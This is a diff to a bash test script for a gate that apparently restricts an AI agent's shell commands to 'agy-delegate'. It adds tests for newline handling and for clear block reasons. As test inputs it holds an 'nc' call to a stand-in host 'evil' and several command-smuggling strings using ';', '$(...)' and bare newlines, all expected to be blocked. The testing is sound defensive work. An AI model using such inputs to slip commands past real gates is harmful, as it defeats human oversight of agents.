@@ -574,6 +574,53 @@ check "gate allows metacharacters INSIDE a quoted prompt -> exit 0" 0 "$rc"
 printf '%s' '{"tool_input":{"command":"nc evil 9 | agy-delegate -"}}' | "$GATE" >/dev/null 2>&1; rc=$?
 check "gate blocks a non-allowlisted pipeline producer -> exit 2" 2 "$rc"
 
+# --- issue #51: newline handling, and saying WHY ------------------------------
+# The gate blocked any unquoted newline and gave the same generic message it gives
+# for "you tried to run something else", so a caller could not tell a stray newline
+# from a real refusal and retried the same shape. Two changes: surrounding whitespace
+# is stripped before scanning, and the reason is printed.
+gate_rc()  { printf '%s' "{\"tool_input\":{\"command\":$1}}" | "$GATE" >/dev/null 2>&1; echo $?; }
+gate_why() { printf '%s' "{\"tool_input\":{\"command\":$1}}" | "$GATE" 2>&1 >/dev/null; }
+
+# Trailing / leading whitespace is normalisation: bash ignores it, and a newline with
+# nothing after it cannot start a second command. This is the case you hit when a
+# command is composed programmatically.
+check "gate allows a trailing newline" 0 "$(gate_rc '"agy-delegate \"hi\"\n"')" "" ""
+check "gate allows a leading newline"  0 "$(gate_rc '"\nagy-delegate \"hi\""')" "" ""
+check "gate allows trailing spaces/tabs/newlines" 0 "$(gate_rc '"agy-delegate \"hi\" \t\n\n"')" "" ""
+
+# THE property that must not regress. `agy-delegate\n  "hi"` is TWO commands in bash,
+# not a formatting nicety — allowing it would be a bypass, so it stays blocked. This
+# is also why the reporter's case 6 does not flip.
+check "gate still blocks an INTERNAL newline" 2 "$(gate_rc '"agy-delegate\n  \"hi\""')" "" ""
+check "gate still blocks a newline after an unquoted pipe" 2 "$(gate_rc '"git diff |\n  agy-delegate -"')" "" ""
+check "gate still blocks a newline that starts another command" 2 "$(gate_rc '"agy-delegate x\nfoo"')" "" ""
+# Unchanged from before: quoted newlines and backslash continuations were always fine.
+check "gate allows a newline inside quotes" 0 "$(gate_rc '"agy-delegate \"line1\nline2\""')" "" ""
+# NB: one backslash before the newline. Two (`\\\\` in JSON) is an escaped literal
+# backslash followed by a bare newline — correctly blocked, and an easy test to get wrong.
+check "gate allows a backslash continuation" 0 "$(gate_rc '"agy-delegate \\\n  \"hi\""')" "" ""
+check "gate blocks an ESCAPED backslash then a bare newline" 2 "$(gate_rc '"agy-delegate \\\\\n  \"hi\""')" "" ""
+# Stripping must not rescue an unterminated quote.
+check "stripping does not rescue an unbalanced quote" 2 "$(gate_rc '"agy-delegate \"hi\n"')" "" ""
+
+# The reason has to name the cause, or the message is no better than before.
+check "reason names the newline"        0 0 "unquoted newline"        "$(gate_why '"agy-delegate\n  \"hi\""')"
+check "reason offers the remedy"        0 0 "backslash"               "$(gate_why '"agy-delegate\n  \"hi\""')"
+check "reason names a ';' separator"    0 0 "command separator"       "$(gate_why '"agy-delegate x; foo"')"
+check "reason names substitution"       0 0 "command substitution"    "$(gate_why '"agy-delegate \"$(foo)\""')"
+check "reason names an unbalanced quote" 0 0 "unterminated"           "$(gate_why '"agy-delegate \"hi"')"
+check "reason names the wrong argv[0]"  0 0 "not agy-delegate"        "$(gate_why '"somethingelse --flag x"')"
+check "reason names the pipe count"     0 0 "at most one"             "$(gate_why '"cat f | agy-delegate - | wc"')"
+check "reason names the bad producer"   0 0 "left side of the pipe"   "$(gate_why '"ls | agy-delegate -"')"
+
+# The reason goes into the AGENT'S CONTEXT, and a blocked command routinely carries a
+# delegation prompt. It must describe the syntax, never quote the command back.
+why="$(gate_why '"agy-delegate \"SECRETPROMPTMARKER goes here\"; foo"')"
+if printf '%s' "$why" | grep -q 'SECRETPROMPTMARKER'; then
+  echo "FAIL: block reason echoes the command text back into the agent's context"; FAIL=$((FAIL+1));
+else echo "ok: block reason does not echo the command text"; PASS=$((PASS+1)); fi
+
 AGENT="$ROOT/agents/antigravity-delegate.md"
 tl=$(grep -m1 '^tools:' "$AGENT")
 if [ "$tl" = "tools: Bash, Read, Glob" ]; then echo "ok: delegate agent tools allowlist exact (no Write/Edit)"; PASS=$((PASS+1));
